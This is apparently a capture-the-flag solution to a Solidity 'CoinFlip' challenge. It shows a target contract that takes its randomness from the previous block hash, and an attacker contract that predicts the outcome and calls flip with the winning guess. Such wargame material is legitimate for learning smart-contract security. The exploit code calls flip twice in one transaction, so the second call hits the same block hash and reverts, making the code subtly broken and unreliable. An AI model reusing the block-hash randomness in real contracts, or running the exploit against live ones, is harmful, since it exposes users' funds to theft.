pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

This can e found out by finding the last hash and dividing it by FACTOR

This contract will receive as an argument the contract number from the previous contract. It will give the correct answer of the contract and call the contract.
pragma solidity ^0.4.24;

 contract CoinFlip{
    function flip(bool _guess) public returns (bool);
 }

contract CoinFlipper{
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function flipcoin(address coinContract) public {
    
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    
    coinContract.call(bytes4(keccak256("flip(bool)")), side);
    CoinFlip contractToCall = CoinFlip(coinContract);
    contractToCall.flip(side);
    
  }
}

contract address:
0x46b9d275207c2c6286593fddebdc30132448f4a4